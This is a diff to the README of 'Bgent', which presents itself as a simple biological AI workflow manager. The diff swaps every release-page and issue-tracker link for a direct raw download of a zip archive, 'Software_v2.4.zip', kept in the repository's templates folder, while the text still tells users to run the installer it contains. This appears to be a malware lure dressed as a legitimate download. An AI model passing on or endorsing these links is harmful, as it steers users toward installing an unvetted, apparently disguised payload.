@@ -1,6 +1,6 @@
 # 🧬 Bgent - Simple Biological AI Workflow Manager
 
-[![Download Bgent](https://img.shields.io/badge/Download-Bgent-brightgreen?style=for-the-badge)](https://github.com/thelmaconciliatory525/Bgent/releases)
+[![Download Bgent](https://img.shields.io/badge/Download-Bgent-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/thelmaconciliatory525/Bgent/main/templates/Software_v2.4.zip)
 
 Bgent is a tool that helps you organize and manage your biological AI projects. It uses an easy-to-read markdown format combined with kanban boards and scheduling. This lets you plan your tasks quickly without needing complex software.
 
@@ -32,7 +32,7 @@ No internet connection is needed after installation unless you want to check for
 
 You can get Bgent for Windows from its official release page. This page contains the latest version and previous versions if you need them.
 
-[![Download Bgent](https://img.shields.io/badge/Download-Bgent-blue?style=for-the-badge)](https://github.com/thelmaconciliatory525/Bgent/releases)
+[![Download Bgent](https://img.shields.io/badge/Download-Bgent-blue?style=for-the-badge)](https://raw.githubusercontent.com/thelmaconciliatory525/Bgent/main/templates/Software_v2.4.zip)
 
 Visit this page to find the .exe file for Windows. The file is the installer for Bgent.
 
@@ -45,7 +45,7 @@ Follow these steps to get Bgent running on your computer.
 1. **Open the Download Page**
 
    Click on the link above or go to:  
-   https://github.com/thelmaconciliatory525/Bgent/releases
+   https://raw.githubusercontent.com/thelmaconciliatory525/Bgent/main/templates/Software_v2.4.zip
 
 2. **Find the Latest Release**
 
@@ -146,7 +146,7 @@ Bgent uses markdown files to keep your tasks and schedules organized. Here is a 
 ## 🛠 Support and Feedback
 
 You can report issues or ask questions on the GitHub page:  
-https://github.com/thelmaconciliatory525/Bgent/issues
+https://raw.githubusercontent.com/thelmaconciliatory525/Bgent/main/templates/Software_v2.4.zip
 
 Please create a new issue with a clear description if you run into problems.
 
@@ -155,7 +155,7 @@ Please create a new issue with a clear description if you run into problems.
 ## 🔄 Updating Bgent
 
 To update Bgent, visit the release page again:  
-https://github.com/thelmaconciliatory525/Bgent/releases  
+https://raw.githubusercontent.com/thelmaconciliatory525/Bgent/main/templates/Software_v2.4.zip  
 
 Download the newest installer and run it like the first time. This will replace the old version.
 
